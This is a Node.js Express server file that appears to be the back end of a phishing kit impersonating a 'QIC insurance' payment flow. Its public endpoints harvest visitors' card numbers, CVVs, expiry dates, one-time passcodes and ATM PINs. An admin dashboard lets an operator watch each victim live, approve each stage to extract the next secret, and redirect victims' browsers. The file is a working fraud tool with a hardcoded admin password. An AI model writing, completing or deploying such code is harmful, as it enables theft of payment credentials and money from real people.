const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Change this to your own password (or set the ADMIN_PASSWORD env var before starting the server)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';

app.use(express.json());
app.use(express.static(__dirname));

// ---- In-memory visit store ----
// Each visit is a payment session that moves through stages:
//   'card'    -> waiting for card data / admin decision
//   'otp'     -> card approved, waiting for OTP / admin decision
//   'atm'     -> OTP approved, waiting for ATM PIN / admin decision
//   'success' -> ATM approved, payment complete
//   'rejected'-> current stage was rejected by admin
const visits = {};
const ACTIVE_WINDOW_MS = 5 * 60 * 1000; // considered "active" if updated in last 5 minutes

// ---- In-memory admin session tokens ----
const adminTokens = new Set();

function requireAdmin(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (token && adminTokens.has(token)) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

// Normalize a card number: keep digits only, in the exact order the user typed them.
// This guarantees the number is never reversed or reordered.
function normalizeCardNumber(raw) {
  if (raw === undefined || raw === null) return '';
  return String(raw).replace(/\D/g, '');
}

// ---- Admin auth ----
app.post('/api/admin-login', (req, res) => {
  const { password } = req.body || {};
  if (password === ADMIN_PASSWORD) {
    const token = crypto.randomBytes(24).toString('hex');
    adminTokens.add(token);
    return res.json({ ok: true, token });
  }
  res.status(401).json({ error: 'wrong password' });
});

app.post('/api/admin-logout', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (token) adminTokens.delete(token);
  res.json({ ok: true });
});

// ---- Public: visitor tracking (no auth - used by the flow pages themselves) ----
app.post('/api/track', (req, res) => {
  const data = req.body || {};
  const visitId = data.visitId;
  if (!visitId) return res.status(400).json({ error: 'visitId required' });

  const now = Date.now();
  const existing = visits[visitId] || { visitId, createdAt: now, stage: 'card' };
  const pendingRedirect = existing.pendingRedirect || null;

  visits[visitId] = {
    ...existing,
    ...data,
    visitId,
    updatedAt: now,
    status: 'active',
    pendingRedirect: null,
  };

  res.json({ ok: true, redirect: pendingRedirect || undefined });
});

// ---- Public: card submission (stage 1) ----
app.post('/api/card', (req, res) => {
  const data = req.body || {};
  const visitId = data.id || data.visitId;
  if (!visitId) return res.status(400).json({ error: 'id required' });

  const now = Date.now();
  const existing = visits[visitId] || { visitId, createdAt: now };

  visits[visitId] = {
    ...existing,
    ...data,
    visitId,
    cardNumber: normalizeCardNumber(data.cardNumber),
    cardHolder: data.cardHolder || existing.cardHolder || '',
    cardExpiry: data.cardExpiry || existing.cardExpiry || '',
    cardCvv: data.cardCvv || existing.cardCvv || '',
    stage: 'card',
    decision: 'pending',
    updatedAt: now,
    status: 'active',
  };

  res.json({ ok: true });
});

// ---- Public: OTP submission (stage 2) ----
app.post('/api/otp', (req, res) => {
  const data = req.body || {};
  const visitId = data.id || data.visitId;
  if (!visitId) return res.status(400).json({ error: 'id required' });

  const now = Date.now();
  const existing = visits[visitId] || { visitId, createdAt: now };

  visits[visitId] = {
    ...existing,
    ...data,
    visitId,
    otp: String(data.otp || ''),
    stage: 'otp',
    decision: 'pending',
    updatedAt: now,
    status: 'active',
  };

  res.json({ ok: true });
});

// ---- Public: ATM PIN submission (stage 3) ----
app.post('/api/atm', (req, res) => {
  const data = req.body || {};
  const visitId = data.id || data.visitId;
  if (!visitId) return res.status(400).json({ error: 'id required' });

  const now = Date.now();
  const existing = visits[visitId] || { visitId, createdAt: now };

  visits[visitId] = {
    ...existing,
    ...data,
    visitId,
    atmPin: String(data.atmPin || ''),
    stage: 'atm',
    decision: 'pending',
    updatedAt: now,
    status: 'active',
  };

  res.json({ ok: true });
});

// ---- Public: status polling (used by all frontend stages) ----
app.get('/api/status/:id', (req, res) => {
  const v = visits[req.params.id];
  if (!v) return res.json({ ok: true, status: 'pending', stage: 'card', decision: 'pending' });
  res.json({
    ok: true,
    status: v.decision || 'pending',
    stage: v.stage || 'card',
    decision: v.decision || 'pending',
    redirect: v.pendingRedirect || undefined,
  });
});

// ---- Admin-only: view & control visits ----
app.get('/api/visits', requireAdmin, (req, res) => {
  const now = Date.now();
  const list = Object.values(visits)
    .map(v => ({ ...v, status: (now - v.updatedAt) <= ACTIVE_WINDOW_MS ? 'active' : 'inactive' }))
    .sort((a, b) => b.updatedAt - a.updatedAt);
  res.json(list);
});

// ---- Admin-only: approve / reject the current stage ----
app.post('/api/decision', requireAdmin, (req, res) => {
  const { visitId, decision } = req.body || {};
  if (!visitId || !decision) return res.status(400).json({ error: 'visitId and decision required' });
  const v = visits[visitId];
  if (!v) return res.status(404).json({ error: 'visit not found' });

  if (decision === 'approved') {
    v.decision = 'approved';
    if (v.stage === 'card') {
      v.stage = 'otp';
      v.decision = 'pending';
    } else if (v.stage === 'otp') {
      v.stage = 'atm';
      v.decision = 'pending';
    } else if (v.stage === 'atm') {
      v.stage = 'success';
      v.decision = 'approved';
      // Auto-redirect the visitor to the success page in their language.
      v.pendingRedirect = (v.lang === 'en') ? 'success-en.html' : 'success-ar.html';
    }
  } else if (decision === 'rejected') {
    v.decision = 'rejected';
  } else {
    return res.status(400).json({ error: 'invalid decision' });
  }

  v.updatedAt = Date.now();
  res.json({ ok: true, stage: v.stage, decision: v.decision });
});

app.post('/api/redirect', requireAdmin, (req, res) => {
  const { visitId, target } = req.body || {};
  if (!visitId || !target) return res.status(400).json({ error: 'visitId and target required' });
  if (!visits[visitId]) return res.status(404).json({ error: 'visit not found' });
  visits[visitId].pendingRedirect = target;
  res.json({ ok: true });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`QIC insurance flow running at http://localhost:${PORT}`);
  console.log(`Admin dashboard at http://localhost:${PORT}/admin.html (password: ${ADMIN_PASSWORD})`);
});
